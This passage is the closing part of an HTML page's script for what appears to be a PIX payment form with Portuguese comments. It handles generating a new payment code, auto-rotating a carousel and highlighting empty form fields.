                checkBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Verificar Pagamento';
            }
        });

        // Botão novo pagamento
        document.getElementById('newPaymentBtn').addEventListener('click', function() {
            if (confirm('Deseja gerar um novo código PIX? O código atual será invalidado.')) {
                // Limpa timer
                if (timerInterval) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                }
                
                // Limpa transação atual
                currentTransactionId = null;
                
                // Reseta formulário
                document.getElementById('paymentForm').reset();
                
                // Volta para o primeiro step
                showStep('step1');
            }
        });

        // Auto-inicia o carrossel
        setInterval(() => {
            moveCarousel(1);
        }, 5000);

        // Validação de formulário em tempo real
        document.querySelectorAll('#paymentForm input').forEach(input => {
            input.addEventListener('blur', function() {
                if (this.value.trim() === '') {
                    this.style.borderColor = '#ef4444';
                } else {
                    this.style.borderColor = '#d1d5db';
                }
            });
        });
    </script>
</body>
</html>